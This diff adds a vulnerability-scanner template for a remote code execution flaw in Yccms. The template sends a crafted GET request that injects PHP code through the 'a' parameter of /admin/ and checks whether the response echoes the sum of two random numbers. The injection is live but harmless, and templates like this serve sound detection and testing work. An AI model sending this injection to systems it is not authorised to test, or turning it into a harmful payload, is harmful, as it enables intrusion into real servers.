@@ -1,0 +1,22 @@
+id: poc-yaml-yccms-rce
+info:
+  name: Yccms Remote Code Execution Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploits a remote code execution vulnerability in Yccms by evaluating arithmetic expressions in the server response.
+variables:
+  r: "{{rand_int(100000, 910000)}}"
+  r1: "{{rand_int(100000, 910000)}}"
+http:
+  - raw:
+      - |
+        GET /admin/?a=Factory();print({{r}}+{{r1}});//../ HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "{{to_number(r) + to_number(r1)}}"
+        part: body
